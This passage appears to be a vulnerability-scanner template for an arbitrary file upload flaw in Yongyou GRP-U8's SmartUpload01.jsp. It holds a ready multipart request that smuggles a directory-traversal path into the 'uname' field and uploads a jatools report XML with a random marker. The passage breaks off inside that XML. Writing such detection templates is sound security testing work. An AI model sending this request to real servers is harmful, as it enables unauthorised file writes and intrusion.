id: poc-yaml-yongyou-grp-u8-smartupload01-anyfile-upload
info:
  name: Yongyou GRP-U8 SmartUpload01 File Upload Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    Exploitation of the SmartUpload01.jsp file upload vulnerability in Yongyou GRP-U8, allowing arbitrary file uploads.
  tags: file-upload
  metadata:
    product: Yongyou GRP-U8

variables:
  random_name: '{{rand_base(20)}}'
  content: '{{rand_base(32)}}'

flow: |
  http(1) && http(2)

http:
  - id: upload-check
    method: POST
    path:
      - '{{BaseURL}}/u8qx/SmartUpload01.jsp'
    headers:
      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryosqexjih
    body: |
      ------WebKitFormBoundaryosqexjih
      Content-Disposition: form-data; name="uname"

      ../../../../../../../../../{{random_name}}
      ------WebKitFormBoundaryosqexjih
      Content-Disposition: form-data; name="input_localfile"; filename="{{random_name}}.pdf"

      <jatools Class="jatools.ReportDocument" Name="jatools report template">
      <VariableContext>
      </VariableContext>
      <Page>
      <Name>panel</Name>
      <Children ItemClass="PagePanel">
      <Item0>
      <Name>header</Name>
      <Width>753</Width>
      <Height>80</Height>
      <Children ItemClass="Label">
      <Item0>
      <Text>用一个Student对象,和其getMembers()方法,作成一个嵌套的表格dlvmwt</Text>
      <ForeColor>-65536</ForeColor>
      <X>41</X>
      <Y>15</Y>
      <Width>362</Width>
      <Height>62</Height>
      </Item0>
      </Children>
      <Type>100</Type>
      </Item0>
      <Item1>
      <Name>footer</Name>
      <Y>802</Y>
      <Width>753</Width>
      <Height>280</Height>
      <Type>103</Type>
      </Item1>
      <Item2>
      <Name>body</Name>
      <Y>80</Y>
      <Width>753</Width>
      <Height>722</Height>
      <Children ItemClass="Table">
      <Item0>
      <NodePath>学生表</NodePath>
      <X>115</X>
      <Y>77</Y>
      <Children>
      <Item0 Class="Label">
      <Text>家庭成员</Text>
      <Border/>
      <PrintStyle>united-level:1;</PrintStyle>
      <Cell>
      <Row>3</Row>
      <Col>0</Col>
      <RowSpan>2</RowSpan>
      </Cell>
      </Item0>
      <Item1 Class="Label">
      <Text>关系</Text>
      <BackColor>-4144897</BackColor>
      <Border/>
      <Cell>
      <Row>3</Row>
      <Col>1</Col>
      </Cell>
      </Item1>
      <Item2 Class="Label">
      <Text>性别</Text>
      <BackColor>-4144897</BackColor>
      <Border/>
      <Cell>
      <Row>3</Row>
      <Col>2</Col>
      </Cell>
      </Item2>
      <Item3 Class="Label">
      <Text>年龄</Text>
      <BackColor>-4144897</BackColor>
      <Border/>
      <Cell>
      <Row>3</Row>
      <Col>3</Col>
      </Cell>
      </Item3>
      <Item4 Class="Label">
      <Text>得分</Text>
      <Border/>
      <Cell>
      <Row>2</Row>
      <Col>0</Col>
      </Cell>
      </Item4>
      <Item5 Class="Label">
      <Text>性别</Text>
      <Border/>
      <Cell>
      <Row>1</Row>
      <Col>0</Col>
      </Cell>
      </Item5>
      <Item6 Class="Label">
      <Text>姓名</Text>
      <Border/>
